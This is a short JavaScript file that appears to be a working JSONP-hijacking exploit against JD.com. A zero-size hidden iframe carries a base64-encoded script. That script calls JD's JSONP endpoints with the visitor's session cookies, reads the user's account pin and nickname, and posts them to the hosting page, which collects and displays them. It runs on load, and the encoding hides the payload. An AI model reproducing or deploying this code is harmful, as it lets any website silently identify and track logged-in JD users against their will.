// 用户名  用户id   (cookie中有电话号码)

function c(T) {
  console.log(JSON.parse(T.data.d.pin))
  console.log(JSON.parse(T.data.d.username))
  if ('jd' === T.data.source) {
    var c = T.data.d,
      I = '',
      d = '',
      y = JSON.parse(c.pin)
    if (0 != y.subCode) I = 'no record'
    else {
      I =
        null == y.waresPagedList[0].srv.match(/pin=(.*?)\$/)
          ? 'no record'
          : RegExp.$1
    }
    var l = JSON.parse(c.username)
    if (
      ((d = 1 != l.resultCode ? 'no record' : l.returnObj.userNickName),
      ('no record' != I && '' != I) || 'no record' != d)
    ) {
      var e = { valid: !0, data: { pin: I, username: d } }

      let innerHTML = `
      <div class='item'>
        <p class='title'>京东</p>
        <p>用户id: ${e.data.pin}</p>
        <p>用户名: ${e.data.username}</p>
      </div>
    `
      let dom = document.createElement('div')
      dom.innerHTML = innerHTML

      document.getElementById('content').appendChild(dom)
      console.log(e)

      // J.default.saveToWindow(e, 'jd')
    }
  } else {
    console.log(T.data)
  }
}
function jd() {
  var J = document.createElement('iframe')
  J.src =
    'data:text/html;base64,PHNjcmlwdD4KCXZhciBkYXRhID0ge30KCXdpbmRvdy5jID0gMAoJc2NyaXB0MSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpCglzY3JpcHQxLmFzeW5jID0gdHJ1ZQoJc2NyaXB0MS5zcmMgPSAiaHR0cHM6Ly9hcGkubS5qZC5jb20vY2xpZW50LmFjdGlvbj9mdW5jdGlvbklkPWdldEJhYmVsUHJvZHVjdFBhZ2VkJmJvZHk9JTdiJTIyJTczJTY1JTYzJTZmJTZlJTY0JTU0JTYxJTYyJTQ5JTY0JTIyJTNhJTIyJTMwJTMwJTMxJTM1JTM1JTM1JTM1JTM0JTM3JTMwJTM4JTM5JTMzJTVmJTMwJTMzJTM3JTMyJTM2JTM2JTMwJTMwJTVmJTIyJTJjJTIyJTc0JTc5JTcwJTY1JTIyJTNhJTIyJTMwJTIyJTJjJTIyJTcwJTYxJTY3JTY1JTRlJTc1JTZkJTIyJTNhJTIyJTMxJTIyJTJjJTIyJTZkJTY5JTc0JTY1JTZkJTQxJTY0JTY0JTcyJTQ5JTY0JTIyJTNhJTIyJTIyJTJjJTIyJTY3JTY1JTZmJTIyJTNhJTdiJTIyJTZjJTZlJTY3JTIyJTNhJTIyJTIyJTJjJTIyJTZjJTYxJTc0JTIyJTNhJTIyJTIyJTdkJTJjJTIyJTYxJTY0JTY0JTcyJTY1JTczJTczJTQ5JTY0JTIyJTNhJTIyJTIyJTJjJTIyJTcwJTZmJTczJTRjJTZlJTY3JTIyJTNhJTIyJTIyJTJjJTIyJTcwJTZmJTczJTRjJTYxJTc0JTIyJTNhJTIyJTIyJTJjJTIyJTY2JTZmJTYzJTc1JTczJTIyJTNhJTIyJTIyJTJjJTIyJTY5JTZlJTZlJTY1JTcyJTQxJTZlJTYzJTY4JTZmJTcyJTIyJTNhJTIyJTIyJTdkJnNjcmVlbj0yNzk5KjEyMDgmY2xpZW50PXdoNSZjbGllbnRWZXJzaW9uPTEuMC4wJnNpZD0mdXVpZD0mYXJlYT0mXz0xNTg1ODIzMDY4ODUwJmNhbGxiYWNrPWpzb25wMSIKCXNjcmlwdDIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKQoJc2NyaXB0Mi5hc3luYyA9IHRydWUKCXNjcmlwdDIuc3JjID0gImh0dHBzOi8vYXBpLm0uamQuY29tL2FwaT9hcHBpZD1wY19ob21lX3BhZ2UmZnVuY3Rpb25JZD1nZXRCYXNlVXNlckluZm8mbG9naW5UeXBlPTMmanNvbnA9anNvbnAyIgoJZnVuY3Rpb24ganNvbnAxKHBpbl9kYXRhKSB7CgkJZGF0YS5waW4gPSBKU09OLnN0cmluZ2lmeShwaW5fZGF0YSkKCQl3aW5kb3cuYyArPSAxCgkJaWYgKHdpbmRvdy5jID49IDIpIHsKCQkJbGV0IHMgPSB7c291cmNlOiAiamQiLCBkOiBkYXRhfQoJCQl3aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHMsICIqIikKCQl9Cgl9CglmdW5jdGlvbiBqc29ucDIodXNlcm5hbWVfZGF0YSkgewoJCWRhdGEudXNlcm5hbWUgPSBKU09OLnN0cmluZ2lmeSh1c2VybmFtZV9kYXRhKQoJCXdpbmRvdy5jICs9IDEKCQlpZiAod2luZG93LmMgPj0gMikgewoJCQlsZXQgcyA9IHtzb3VyY2U6ICJqZCIsIGQ6IGRhdGF9CgkJCXdpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UocywgIioiKQoJCX0KCX0KCWRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChzY3JpcHQxKQoJZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmFwcGVuZENoaWxkKHNjcmlwdDIpCjwvc2NyaXB0PgoK'
  J.width = 0
  J.height = 0
  J.style.borderWidth = 0

  document.documentElement.appendChild(J)
}

window.addEventListener('message', c, !1)

// window.addEventListener('load', function () {
jd()
// })
